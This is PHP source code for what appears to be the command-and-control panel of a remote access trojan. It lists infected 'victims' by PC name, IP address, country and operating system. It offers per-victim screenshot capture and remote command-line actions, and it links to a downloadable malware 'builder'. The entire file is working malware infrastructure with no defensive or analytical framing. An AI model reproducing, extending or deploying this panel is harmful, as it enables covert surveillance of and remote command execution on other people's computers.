<?php
session_start();
include('api/api.php');
if (isset($_SESSION['csrftoken'])) {
    if (check_login($_SESSION['csrftoken']) == false) { header('location: index.php'); }
} else { header('location: index.php'); }
?>
<html>
    <head>
        <title>Marker - Panel</title>
        <meta charset="utf-8">
        <meta name="robots" content="noodp"/>
        <meta property="og:locale" content="ar_AR" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="X-UA-Compatible" content="IE=8" />
        <meta name="theme-color" content="#cccccc" />
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="Content-Script-Type" content="text/javascript" />
        <link type="text/css" rel="stylesheet" href="style.css">
        <script src="linked/a5794e9cdf.js"></script>
        <script src="linked/jquert-3.2.1.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                var clicked = 1;
                $('#offline_table').click(function() {
                    $('#table_element').slideToggle(500);
                    if (clicked == 1) {
                        clicked = 2;
                        $('#minus').css('display', 'none');
                        $('#plus').css('display', 'inline');
                    } else {
                        clicked = 1;
                        $('#minus').css('display', 'inline');
                        $('#plus').css('display', 'none');
                    }
                });
            });
        </script>
    </head>
    <body>
        <section class="head">
            <a href="setting.php">Setting</a>
            <a href="blacklist.php">Black List</a>
            <a href="api/builder.rar">Donwload Builder</a>
            <a href="logout.php">Logout</a>
        </section>
        <section class="content">
            <table style="width: 100%;" class="table">
                <tr>
                    <th colspan="2"># NAME/PC</th>
                    <th>IP ADDRESS</th>
                    <th>COUNTRY</th>
                    <th>OP SYSTEM</th>
                    <th colspan="4">ACTION</th>
                </tr>
                <?php
                $files = scandir('vc');
                $count_files = count($files);
                $loops = 0;
                foreach ($files as $x) {
                    if ($loops >= 2) {
                        if ($x !== 'index.php') {
                            include_once("vc/$x");
                            $f = md5($ip_address);
                            if ($date1 >= date('ymdhi').(date('s') - 10)) {
                ?>
                <tr>
                    <th><?php echo '#'.($loops - 1); ?></th>
                    <th><?php echo htmlspecialchars($pc_name); ?></th>
                    <th><?php echo htmlspecialchars($ip_address); ?></th>
                    <th><?php echo htmlspecialchars($country); ?></th>
                    <th><?php echo htmlspecialchars($op_system); ?></th>
                    <th><a title="get screenshot" href="screenshot.php?m=<?php echo $f; ?>"><i class="fa fa-eye" aria-hidden="true"></i></a></th>
                    <th><a title="Send commandline" href="command.php?m=<?php echo $f; ?>"><i class="fa fa-terminal" aria-hidden="true"></i></a></th>
                    <th><a title="Remove victim" href="action.php?r&m=<?php echo $f; ?>"><i class="fa fa-trash" aria-hidden="true"></i></a></th>
                    <th><a style="color: red;" title="remove and add in black list" href="action.php?b&m=<?php echo $f; ?>"><i class="fa fa-square" aria-hidden="true"></i></a></th>
                </tr>
                <?php
                            }
                        }
                    }
                    $loops = $loops + 1;
                }
                ?>
            </table>
            <?php
            if ($count_files == 3) {
            ?>
            <section class="novic" style="padding: 10px; text-align: center; font-family: Tahoma;">
                <h>No Victims Available !</h>
            </section>
            <?php
            } else {
            ?>
            <br>
            <table style="width: 100%;">
                <tr style="cursor: pointer;" id="offline_table">
                    <th colspan="2" style="background: #0b4675; text-align: left; color: white; padding: 5px; font-family: Tahoma; font-size: 13px;">
                        <i id="minus" class="fa fa-minus-square" aria-hidden="true"></i>
                        <i id="plus" style="display: none;" class="fa fa-plus-square-o" aria-hidden="true"></i>
                        OFFLINE
                    </th>
                </tr>
                <table id="table_element" style="width: 100%; background: rgba(240,240,240,1);">
                    <tr>
                        <th colspan="2"></th>
                    </tr>
                    <?php
                    $files = scandir('vc');
                    $loops = 0;
                    $loops = 0;
                    foreach ($files as $x) {
                        if ($loops >= 2) {
                            if ($x !== 'index.php') {
                                include_once("vc/$x");
                                $f = md5($ip_address);
                                if ($date1 <= date('ymdhi').(date('s') - 10)) {
                    ?>
                    <tr>
                        <th style="text-align: left; font-family: Tahoma; font-size: 13px;"><?php echo '#'.($loops - 1).' '.'<h style="color: red;">'.htmlspecialchars($ip_address).'</h>'; ?></th>
                        <th style="text-align: right;"><a style="color: red;" title="Remove victim" href="action.php?r&m=<?php echo $f; ?>"><i class="fa fa-trash" aria-hidden="true"></i></a></th>
                    </tr>
                    <?php
                                }
                            }
                        }
                        $loops = $loops + 1;
                    }
                    ?>
                </table>
            </table>
            <?php
            }
            ?>
        </section>
    </body>
</html>